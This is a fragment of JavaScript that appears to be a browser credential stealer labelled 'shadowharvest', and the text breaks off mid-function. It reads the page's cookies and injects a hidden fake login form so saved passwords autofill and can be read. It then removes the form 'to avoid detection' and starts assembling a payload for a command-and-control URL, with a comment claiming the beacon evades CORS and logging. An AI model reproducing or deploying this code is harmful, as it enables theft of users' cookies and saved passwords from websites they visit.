        const cookies = document.cookie;
        const domain = window.location.hostname;
        return {
            domain: domain,
            cookies: cookies.split(';').map(c => c.trim())
        };
    };

    // Phase 2: Saved Credential Extraction (Phishing Autofill)
    const harvestCredentials = () => {
        const fakeLoginForm = document.createElement('form');
        fakeLoginForm.id = 'shadowharvest_phish';
        fakeLoginForm.innerHTML = `
            <input type="text" name="username" autocomplete="username" />
            <input type="password" name="password" autocomplete="current-password" />
        `;
        document.body.appendChild(fakeLoginForm);

        // Trigger autofill (if credentials are saved)
        const usernameField = fakeLoginForm.querySelector('input[name="username"]');
        const passwordField = fakeLoginForm.querySelector('input[name="password"]');

        usernameField.focus();
        passwordField.focus();

        const credentials = {
            username: usernameField.value,
            password: passwordField.value
        };

        fakeLoginForm.remove(); // Clean up to avoid detection
        return credentials;
    };

    // Phase 3: Data Exfiltration (Beacon to C2)
    const exfiltrateData = (data) => {
        const c2Server = "https://malicious-c2-server[.]com/api/collect";
        const payload = {
            victim: window.location.href,
            cookies: data.cookies,
            credentials: data.credentials,
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString()
        };

        // Encoded beacon request (avoids CORS & logging)
